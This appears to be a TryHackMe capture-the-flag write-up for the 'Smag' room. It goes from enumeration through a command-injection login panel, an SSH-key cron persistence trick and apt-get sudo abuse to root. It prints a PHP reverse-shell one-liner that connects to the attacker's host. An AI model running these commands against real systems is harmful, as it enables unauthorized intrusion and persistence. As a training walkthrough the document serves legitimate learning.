# Smag 
[Back to Tryhackme page](../index.md)

---

## Enumeration

Let's save IP address as smag.thm in /etc/hosts file. Now we can start enumeration of machine.

![Nmap scan](nmap%20scan.png)

There are two ports open i.e. HTTP and SSH.
Let's focus on HTTP first.

---

## Website enumeration
Website homepage says it's still under development. Let's enumerate subdirectories using gobuster.

![gobuster 1](gobuster%201.png)

There is "mail" subdirectory. It has emails in very different formats and also one pcapng file i.e packet captured files. Let's check that.

![development smag](development%20smag.png)

In one of packets , we can see HTTP capture on "developement.smag.thm" domain.
Also "login.php" site in it. Let's enumerate this domain.

![Gobuster 2](gobuster%202.png)

login.php has login page , by entering username and password we found in capture file , we can login into site and we get redirected to admin.php . We can enter commands here. But entering commands doesn't give us any output. Let's get reverse shell from this point. 

This is php site so let's get php reverse by using 
```php
php -r '$sock=fsockopen("ip",port);exec("sh <&3 >&3 2>&3");'
``` 
command.

---

## Reverse Shell

We got reverse shell on our machine. Let's upgrade to stable shell.
By looking around , we get to know there is "jake" user. Jake's home directory has user.txt file but it can only be read by jake. Let's try privilege escalation.

After checking around machine , we found a interesting cron job.

![cron job](cron%20job.png)

This file has read and write permissions for other user so let's try to use this point for privilege escalation.

> Refering to this webpage on how to escalate using ssh , I got to know that we can create ssh key pair on our machine and add public key to .authorized_key on victim's machine and we can login into machine using ssh.
> https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/

By adding our public key in jake_id_rsa.pub.backup , cron job will add content in that file to .authorized_keys folder and we will get ssh access for jake user.

---

## User flag
By login into machine , I got user flag.

![smag user flag](smag%20user%20flag.png)

Now we have to get root flag

--- 

## Root flag

![sudo permissions](sudo%20jake%20permissions.png)

Jake user can run apt-get with sudo privilege. Checking gtfobins for possible exploit.

![gtfobins smag apt-get](gtfobins%20apt-get.png)

Let's try all 3 techniques for privilege escalation. Third one gives us root shell.

![smag root flag](root%20flag%20smag.png)

Got root flag.

---

### Sources :
- [Tryhackme smag room](https://tryhackme.com/room/smaggrotto)
- [SSH Key exploit](https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/)









